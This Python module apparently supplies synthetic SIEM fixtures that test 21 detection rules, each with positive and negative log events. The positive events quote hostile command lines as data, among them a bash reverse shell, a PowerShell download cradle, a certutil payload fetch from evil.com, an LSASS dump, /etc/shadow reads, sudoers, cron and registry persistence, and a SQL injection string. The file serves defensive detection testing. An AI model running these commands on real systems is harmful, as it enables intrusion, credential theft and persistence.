"""Synthetic Replayable Telemetry Fixtures for Detection Testing and Validation."""

from datetime import datetime, timezone
from typing import Dict, List, NamedTuple, Optional
from src.siem.models import (
    DNSInfo,
    ECSEvent,
    EndpointInfo,
    EventCategory,
    EventMetadata,
    EventOutcome,
    EventSeverity,
    FileInfo,
    HostInfo,
    HTTPInfo,
    NetworkInfo,
    ProcessInfo,
    RegistryInfo,
    UserInfo,
)


class DetectionFixture(NamedTuple):
    rule_id: str
    rule_name: str
    positive_events: List[ECSEvent]
    negative_events: List[ECSEvent]
    expected_severity: EventSeverity
    expected_mitre_technique: str


def get_all_fixtures() -> Dict[str, DetectionFixture]:
    """Returns a map of rule_id to DetectionFixture covering all detection rules."""
    fixtures = {}

    # 1. DET-AUTH-001: Brute Force Authentication
    pos_auth = [
        ECSEvent(
            event=EventMetadata(
                category=EventCategory.AUTHENTICATION,
                action="ad.logon.failed",
                outcome=EventOutcome.FAILURE,
                severity=EventSeverity.MEDIUM,
            ),
            host=HostInfo(name="dc01.corp.enterprise.local", ip="172.28.20.10"),
            source=EndpointInfo(ip="172.28.20.25"),
            user=UserInfo(name="jdoe"),
            message="Logon failure for user 'jdoe': Bad password.",
            custom={"windows": {"event_id": 4625}, "failed_attempts_count": 5},
        )
    ]
    neg_auth = [
        ECSEvent(
            event=EventMetadata(
                category=EventCategory.AUTHENTICATION,
                action="ad.logon.success",
                outcome=EventOutcome.SUCCESS,
                severity=EventSeverity.INFORMATIONAL,
            ),
            host=HostInfo(name="dc01.corp.enterprise.local", ip="172.28.20.10"),
            source=EndpointInfo(ip="172.28.20.25"),
            user=UserInfo(name="jdoe"),
            message="Successful logon for user 'jdoe'.",
            custom={"windows": {"event_id": 4624}},
        )
    ]
    fixtures["DET-AUTH-001"] = DetectionFixture(
        rule_id="DET-AUTH-001",
        rule_name="Multiple Failed Logon Attempts",
        positive_events=pos_auth,
        negative_events=neg_auth,
        expected_severity=EventSeverity.HIGH,
        expected_mitre_technique="T1110",
    )

    # 2. DET-AUTH-002: Unauthorized Root / Disabled Account Logon
    pos_root = [
        ECSEvent(
            event=EventMetadata(
                category=EventCategory.AUTHENTICATION,
                action="ssh.login.failed",
                outcome=EventOutcome.FAILURE,
            ),
            host=HostInfo(name="srv01.corp.enterprise.local", ip="172.28.20.15"),
            source=EndpointInfo(ip="172.28.20.25"),
            user=UserInfo(name="root"),
            message="Failed password for root from 172.28.20.25 port 49152 ssh2 (PermitRootLogin=no)",
        )
    ]
    neg_root = [
        ECSEvent(
            event=EventMetadata(
                category=EventCategory.AUTHENTICATION,
                action="ssh.login.success",
                outcome=EventOutcome.SUCCESS,
            ),
            host=HostInfo(name="srv01.corp.enterprise.local", ip="172.28.20.15"),
            source=EndpointInfo(ip="172.28.20.25"),
            user=UserInfo(name="sysadmin"),
            message="Accepted password for sysadmin from 172.28.20.25 port 49152 ssh2",
        )
    ]
    fixtures["DET-AUTH-002"] = DetectionFixture(
        rule_id="DET-AUTH-002",
        rule_name="Unauthorized Account Logon Attempt",
        positive_events=pos_root,
        negative_events=neg_root,
        expected_severity=EventSeverity.HIGH,
        expected_mitre_technique="T1078",
    )

    # 3. DET-AUTH-003: Suspicious Cross-Zone Remote Logon
    pos_cross_auth = [
        ECSEvent(
            event=EventMetadata(
                category=EventCategory.AUTHENTICATION,
                action="ad.logon.success",
                outcome=EventOutcome.SUCCESS,
            ),
            host=HostInfo(name="dc01.corp.enterprise.local", ip="172.28.20.10"),
            source=EndpointInfo(ip="172.28.30.10"),
            destination=EndpointInfo(ip="172.28.20.10", port=88),
            user=UserInfo(name="administrator"),
            message="Successful logon for user 'administrator' from DMZ app server.",
        )
    ]
    neg_cross_auth = [
        ECSEvent(
            event=EventMetadata(
                category=EventCategory.AUTHENTICATION,
                action="ad.logon.success",
                outcome=EventOutcome.SUCCESS,
            ),
            host=HostInfo(name="dc01.corp.enterprise.local", ip="172.28.20.10"),
            source=EndpointInfo(ip="172.28.20.25"),
            destination=EndpointInfo(ip="172.28.20.10", port=88),
            user=UserInfo(name="administrator"),
            message="Successful logon for user 'administrator' from management workstation.",
        )
    ]
    fixtures["DET-AUTH-003"] = DetectionFixture(
        rule_id="DET-AUTH-003",
        rule_name="Suspicious Cross-Zone Remote Logon",
        positive_events=pos_cross_auth,
        negative_events=neg_cross_auth,
        expected_severity=EventSeverity.HIGH,
        expected_mitre_technique="T1078",
    )

    # 4. DET-PS-001: Encoded PowerShell Execution
    pos_ps_enc = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            host=HostInfo(name="wkstn01.corp.enterprise.local"),
            user=UserInfo(name="victim"),
            process=ProcessInfo(
                name="powershell.exe",
                command_line="powershell.exe -noni -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA=",
            ),
            message="Process created: powershell.exe -enc SQBFAFgA...",
        )
    ]
    neg_ps_enc = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            host=HostInfo(name="wkstn01.corp.enterprise.local"),
            user=UserInfo(name="sysadmin"),
            process=ProcessInfo(
                name="powershell.exe",
                command_line="powershell.exe -Command Get-Service -Name wuauserv",
            ),
            message="Process created: powershell.exe Get-Service",
        )
    ]
    fixtures["DET-PS-001"] = DetectionFixture(
        rule_id="DET-PS-001",
        rule_name="Suspicious Encoded PowerShell Execution",
        positive_events=pos_ps_enc,
        negative_events=neg_ps_enc,
        expected_severity=EventSeverity.HIGH,
        expected_mitre_technique="T1059",
    )

    # 5. DET-PS-002: PowerShell Download Cradle
    pos_ps_cradle = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            host=HostInfo(name="wkstn01.corp.enterprise.local"),
            process=ProcessInfo(
                name="powershell.exe",
                command_line="powershell.exe -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.5/cradle.ps1')\"",
            ),
            message="PowerShell download cradle invoked",
        )
    ]
    neg_ps_cradle = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            host=HostInfo(name="wkstn01.corp.enterprise.local"),
            process=ProcessInfo(
                name="powershell.exe",
                command_line="powershell.exe -Command \"Get-Process | Where-Object {$_.CPU -gt 10}\"",
            ),
            message="PowerShell diagnostic command",
        )
    ]
    fixtures["DET-PS-002"] = DetectionFixture(
        rule_id="DET-PS-002",
        rule_name="PowerShell Remote Download Cradle",
        positive_events=pos_ps_cradle,
        negative_events=neg_ps_cradle,
        expected_severity=EventSeverity.HIGH,
        expected_mitre_technique="T1059",
    )

    # 6. DET-PS-003: PowerShell Policy Bypass
    pos_ps_bypass = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            host=HostInfo(name="wkstn01.corp.enterprise.local"),
            process=ProcessInfo(
                name="powershell.exe",
                command_line="powershell.exe -ExecutionPolicy Bypass -w hidden -File C:\\Temp\\script.ps1",
            ),
        )
    ]
    neg_ps_bypass = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            host=HostInfo(name="wkstn01.corp.enterprise.local"),
            process=ProcessInfo(
                name="powershell.exe",
                command_line="powershell.exe -File C:\\Scripts\\backup.ps1",
            ),
        )
    ]
    fixtures["DET-PS-003"] = DetectionFixture(
        rule_id="DET-PS-003",
        rule_name="PowerShell Execution Policy Bypass",
        positive_events=pos_ps_bypass,
        negative_events=neg_ps_bypass,
        expected_severity=EventSeverity.MEDIUM,
        expected_mitre_technique="T1562",
    )

    # 7. DET-CRED-001: Kerberoasting TGS Request
    pos_kerb = [
        ECSEvent(
            event=EventMetadata(
                category=EventCategory.DIRECTORY_SERVICE,
                action="ad.kerberos.tgs_request",
                severity=EventSeverity.LOW,
            ),
            host=HostInfo(name="dc01.corp.enterprise.local", ip="172.28.20.10"),
            user=UserInfo(name="attacker"),
            message="Kerberos TGS ticket requested by 'attacker' for SPN 'MSSQLSvc/db01.corp.enterprise.local:1433' (Service User: sqlservice).",
            custom={
                "spn": "MSSQLSvc/db01.corp.enterprise.local:1433",
                "service_account": "sqlservice",
                "encryption_type": "rc4-hmac",
                "ticket_id": "TGS-1234ABCD",
            },
        )
    ]
    neg_kerb = [
        ECSEvent(
            event=EventMetadata(
                category=EventCategory.DIRECTORY_SERVICE,
                action="ad.kerberos.tgt_request",
            ),
            host=HostInfo(name="dc01.corp.enterprise.local", ip="172.28.20.10"),
            user=UserInfo(name="jdoe"),
            message="Kerberos TGT ticket requested by 'jdoe'.",
            custom={"encryption_type": "aes256-cts-hmac-sha1-96"},
        )
    ]
    fixtures["DET-CRED-001"] = DetectionFixture(
        rule_id="DET-CRED-001",
        rule_name="Kerberoasting TGS Request with Weak Encryption",
        positive_events=pos_kerb,
        negative_events=neg_kerb,
        expected_severity=EventSeverity.HIGH,
        expected_mitre_technique="T1558",
    )

    # 8. DET-CRED-002: Linux /etc/shadow Access
    pos_shadow = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            host=HostInfo(name="srv01.corp.enterprise.local"),
            user=UserInfo(name="attacker"),
            process=ProcessInfo(name="cat", command_line="cat /etc/shadow"),
            message="Process executed: cat /etc/shadow",
        )
    ]
    neg_shadow = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            host=HostInfo(name="srv01.corp.enterprise.local"),
            user=UserInfo(name="sysadmin"),
            process=ProcessInfo(name="cat", command_line="cat /etc/hosts"),
            message="Process executed: cat /etc/hosts",
        )
    ]
    fixtures["DET-CRED-002"] = DetectionFixture(
        rule_id="DET-CRED-002",
        rule_name="Linux Sensitive Credential File Access",
        positive_events=pos_shadow,
        negative_events=neg_shadow,
        expected_severity=EventSeverity.HIGH,
        expected_mitre_technique="T1003",
    )

    # 9. DET-CRED-003: LSASS Memory Dump
    pos_lsass = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            host=HostInfo(name="wkstn01.corp.enterprise.local"),
            process=ProcessInfo(
                name="procdump.exe",
                command_line="procdump.exe -ma lsass.exe C:\\Temp\\lsass.dmp",
            ),
        )
    ]
    neg_lsass = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            host=HostInfo(name="wkstn01.corp.enterprise.local"),
            process=ProcessInfo(
                name="procdump.exe",
                command_line="procdump.exe -ma w3wp.exe C:\\Temp\\w3wp.dmp",
            ),
        )
    ]
    fixtures["DET-CRED-003"] = DetectionFixture(
        rule_id="DET-CRED-003",
        rule_name="LSASS Memory Dump & SAM Hive Export",
        positive_events=pos_lsass,
        negative_events=neg_lsass,
        expected_severity=EventSeverity.CRITICAL,
        expected_mitre_technique="T1003",
    )

    # 10. DET-PROC-001: Reverse Shell Execution
    pos_revshell = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            host=HostInfo(name="srv01.corp.enterprise.local"),
            process=ProcessInfo(
                name="bash",
                command_line="bash -i >& /dev/tcp/198.51.100.20/4444 0>&1",
            ),
        )
    ]
    neg_revshell = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            host=HostInfo(name="srv01.corp.enterprise.local"),
            process=ProcessInfo(
                name="bash",
                command_line="/bin/bash /opt/scripts/deploy.sh",
            ),
        )
    ]
    fixtures["DET-PROC-001"] = DetectionFixture(
        rule_id="DET-PROC-001",
        rule_name="Interactive Reverse Shell Execution",
        positive_events=pos_revshell,
        negative_events=neg_revshell,
        expected_severity=EventSeverity.CRITICAL,
        expected_mitre_technique="T1059",
    )

    # 11. DET-PROC-002: LOLBin Abuse
    pos_lolbin = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            host=HostInfo(name="wkstn01.corp.enterprise.local"),
            process=ProcessInfo(
                name="certutil.exe",
                command_line="certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\Temp\\p.exe",
            ),
        )
    ]
    neg_lolbin = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            host=HostInfo(name="wkstn01.corp.enterprise.local"),
            process=ProcessInfo(
                name="certutil.exe",
                command_line="certutil.exe -dump C:\\Certs\\corp_root_ca.cer",
            ),
        )
    ]
    fixtures["DET-PROC-002"] = DetectionFixture(
        rule_id="DET-PROC-002",
        rule_name="Living Off the Land Binary (LOLBin) Abuse",
        positive_events=pos_lolbin,
        negative_events=neg_lolbin,
        expected_severity=EventSeverity.HIGH,
        expected_mitre_technique="T1218",
    )

    # 12. DET-PROC-003: Web Process Spawn
    pos_web_proc = [
        ECSEvent(
            event=EventMetadata(
                category=EventCategory.WEB, action="command_injection"
            ),
            host=HostInfo(name="portal.app.local"),
            process=ProcessInfo(
                name="sh",
                parent_name="uvicorn",
                command_line="sh -c ping -c 1 127.0.0.1; whoami",
            ),
            message="Command injection executed via ping diagnostic endpoint",
        )
    ]
    neg_web_proc = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.WEB, action="http_request"),
            host=HostInfo(name="portal.app.local"),
            http=HTTPInfo(method="GET", url="/api/v1/employees/search?query=Alice"),
            message="Standard employee search query",
        )
    ]
    fixtures["DET-PROC-003"] = DetectionFixture(
        rule_id="DET-PROC-003",
        rule_name="Web Server Spawning Command Shell",
        positive_events=pos_web_proc,
        negative_events=neg_web_proc,
        expected_severity=EventSeverity.HIGH,
        expected_mitre_technique="T1059",
    )

    # 13. DET-PRIVESC-001: Sudoers Modification
    pos_sudoers = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            host=HostInfo(name="srv01.corp.enterprise.local"),
            process=ProcessInfo(
                name="bash",
                command_line="echo 'attacker ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
            ),
        )
    ]
    neg_sudoers = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            host=HostInfo(name="srv01.corp.enterprise.local"),
            process=ProcessInfo(
                name="systemctl",
                command_line="sudo systemctl status nginx",
            ),
        )
    ]
    fixtures["DET-PRIVESC-001"] = DetectionFixture(
        rule_id="DET-PRIVESC-001",
        rule_name="Sudoers File Modification",
        positive_events=pos_sudoers,
        negative_events=neg_sudoers,
        expected_severity=EventSeverity.HIGH,
        expected_mitre_technique="T1548",
    )

    # 14. DET-PRIVESC-002: SUID Bit Modification
    pos_suid = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            host=HostInfo(name="srv01.corp.enterprise.local"),
            process=ProcessInfo(
                name="chmod",
                command_line="chmod u+s /tmp/backdoor_shell",
            ),
        )
    ]
    neg_suid = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            host=HostInfo(name="srv01.corp.enterprise.local"),
            process=ProcessInfo(
                name="chmod",
                command_line="chmod 755 /usr/local/bin/deploy.sh",
            ),
        )
    ]
    fixtures["DET-PRIVESC-002"] = DetectionFixture(
        rule_id="DET-PRIVESC-002",
        rule_name="SUID / SGID Bit Modification",
        positive_events=pos_suid,
        negative_events=neg_suid,
        expected_severity=EventSeverity.HIGH,
        expected_mitre_technique="T1548",
    )

    # 15. DET-PRIVESC-003: SQL Injection
    pos_sqli = [
        ECSEvent(
            event=EventMetadata(
                category=EventCategory.DATABASE, action="database.query"
            ),
            host=HostInfo(name="portal.app.local"),
            http=HTTPInfo(
                url="/api/v1/employees/search?query=' UNION SELECT 1,2,3,4,5,6,7,8 --"
            ),
            message="Query: SELECT * FROM employees WHERE name LIKE '%' UNION SELECT 1,2,3,4,5,6,7,8 --%'",
            custom={"sql_query": "UNION SELECT 1,2,3,4,5,6,7,8 --"},
        )
    ]
    neg_sqli = [
        ECSEvent(
            event=EventMetadata(
                category=EventCategory.DATABASE, action="database.query"
            ),
            host=HostInfo(name="portal.app.local"),
            http=HTTPInfo(url="/api/v1/employees/search?query=Finance"),
            message="Query: SELECT * FROM employees WHERE department = 'Finance'",
        )
    ]
    fixtures["DET-PRIVESC-003"] = DetectionFixture(
        rule_id="DET-PRIVESC-003",
        rule_name="Web Application SQL Injection",
        positive_events=pos_sqli,
        negative_events=neg_sqli,
        expected_severity=EventSeverity.HIGH,
        expected_mitre_technique="T1190",
    )

    # 16. DET-LAT-001: Remote Service / PsExec
    pos_psexec = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            host=HostInfo(name="dc01.corp.enterprise.local"),
            process=ProcessInfo(
                name="sc.exe",
                command_line="sc.exe \\\\dc01 create MaliciousSvc binPath= C:\\Temp\\svc.exe",
            ),
        )
    ]
    neg_psexec = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            host=HostInfo(name="dc01.corp.enterprise.local"),
            process=ProcessInfo(
                name="sc.exe",
                command_line="sc.exe query wuauserv",
            ),
        )
    ]
    fixtures["DET-LAT-001"] = DetectionFixture(
        rule_id="DET-LAT-001",
        rule_name="Remote Service / PsExec Lateral Movement",
        positive_events=pos_psexec,
        negative_events=neg_psexec,
        expected_severity=EventSeverity.HIGH,
        expected_mitre_technique="T1021",
    )

    # 17. DET-LAT-002: Cross-Subnet SSH Lateral Movement
    pos_ssh_lat = [
        ECSEvent(
            event=EventMetadata(
                category=EventCategory.AUTHENTICATION, action="ssh.login.success"
            ),
            host=HostInfo(name="srv01.corp.enterprise.local", ip="172.28.20.15"),
            source=EndpointInfo(ip="172.28.30.10"),
            destination=EndpointInfo(ip="172.28.20.15", port=22),
            user=UserInfo(name="sysadmin"),
            message="Accepted password for sysadmin from 172.28.30.10 port 49152 ssh2",
        )
    ]
    neg_ssh_lat = [
        ECSEvent(
            event=EventMetadata(
                category=EventCategory.AUTHENTICATION, action="ssh.login.success"
            ),
            host=HostInfo(name="srv01.corp.enterprise.local", ip="172.28.20.15"),
            source=EndpointInfo(ip="172.28.20.25"),
            destination=EndpointInfo(ip="172.28.20.15", port=22),
            user=UserInfo(name="sysadmin"),
            message="Accepted password for sysadmin from 172.28.20.25 port 49152 ssh2",
        )
    ]
    fixtures["DET-LAT-002"] = DetectionFixture(
        rule_id="DET-LAT-002",
        rule_name="Cross-Subnet SSH Lateral Movement",
        positive_events=pos_ssh_lat,
        negative_events=neg_ssh_lat,
        expected_severity=EventSeverity.HIGH,
        expected_mitre_technique="T1021",
    )

    # 18. DET-LAT-003: Remote WinRM Execution
    pos_winrm = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            host=HostInfo(name="wkstn01.corp.enterprise.local"),
            process=ProcessInfo(
                name="powershell.exe",
                command_line="Enter-PSSession -ComputerName dc01.corp.enterprise.local -Credential CORP\\Administrator",
            ),
        )
    ]
    neg_winrm = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            host=HostInfo(name="wkstn01.corp.enterprise.local"),
            process=ProcessInfo(
                name="powershell.exe",
                command_line="Get-Service -Name LanmanWorkstation",
            ),
        )
    ]
    fixtures["DET-LAT-003"] = DetectionFixture(
        rule_id="DET-LAT-003",
        rule_name="Remote PowerShell / WinRM Lateral Execution",
        positive_events=pos_winrm,
        negative_events=neg_winrm,
        expected_severity=EventSeverity.MEDIUM,
        expected_mitre_technique="T1021",
    )

    # 19. DET-PERSIST-001: Cron Persistence
    pos_cron = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            host=HostInfo(name="srv01.corp.enterprise.local"),
            process=ProcessInfo(
                name="bash",
                command_line="echo '* * * * * root /tmp/backdoor.sh' >> /etc/cron.d/updater",
            ),
        )
    ]
    neg_cron = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            host=HostInfo(name="srv01.corp.enterprise.local"),
            process=ProcessInfo(
                name="cat",
                command_line="cat /etc/os-release",
            ),
        )
    ]
    fixtures["DET-PERSIST-001"] = DetectionFixture(
        rule_id="DET-PERSIST-001",
        rule_name="Linux Cron Job Persistence",
        positive_events=pos_cron,
        negative_events=neg_cron,
        expected_severity=EventSeverity.HIGH,
        expected_mitre_technique="T1053",
    )

    # 20. DET-PERSIST-002: Registry Run Key Persistence
    pos_reg = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.REGISTRY),
            host=HostInfo(name="wkstn01.corp.enterprise.local"),
            registry=RegistryInfo(
                key="HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                value_name="UpdaterService",
                value_data="C:\\Temp\\backdoor.exe",
                action="set_value",
            ),
            process=ProcessInfo(
                name="reg.exe",
                command_line="reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v UpdaterService /t REG_SZ /d C:\\Temp\\backdoor.exe /f",
            ),
        )
    ]
    neg_reg = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.REGISTRY),
            host=HostInfo(name="wkstn01.corp.enterprise.local"),
            registry=RegistryInfo(
                key="HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion",
                value_name="ProductName",
                action="read",
            ),
            process=ProcessInfo(
                name="reg.exe",
                command_line="reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\" /v ProductName",
            ),
        )
    ]
    fixtures["DET-PERSIST-002"] = DetectionFixture(
        rule_id="DET-PERSIST-002",
        rule_name="Windows Registry Run Key Persistence",
        positive_events=pos_reg,
        negative_events=neg_reg,
        expected_severity=EventSeverity.HIGH,
        expected_mitre_technique="T1547",
    )

    # 21. DET-PERSIST-003: Backdoor Account Creation
    pos_account = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            host=HostInfo(name="srv01.corp.enterprise.local"),
            process=ProcessInfo(
                name="useradd",
                command_line="useradd -m -s /bin/bash -G sudo backdoor_admin",
            ),
        )
    ]
    neg_account = [
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            host=HostInfo(name="srv01.corp.enterprise.local"),
            process=ProcessInfo(
                name="id",
                command_line="id sysadmin",
            ),
        )
    ]
    fixtures["DET-PERSIST-003"] = DetectionFixture(
        rule_id="DET-PERSIST-003",
        rule_name="Unauthorized Local User Account Creation",
        positive_events=pos_account,
        negative_events=neg_account,
        expected_severity=EventSeverity.HIGH,
        expected_mitre_technique="T1136",
    )

    return fixtures
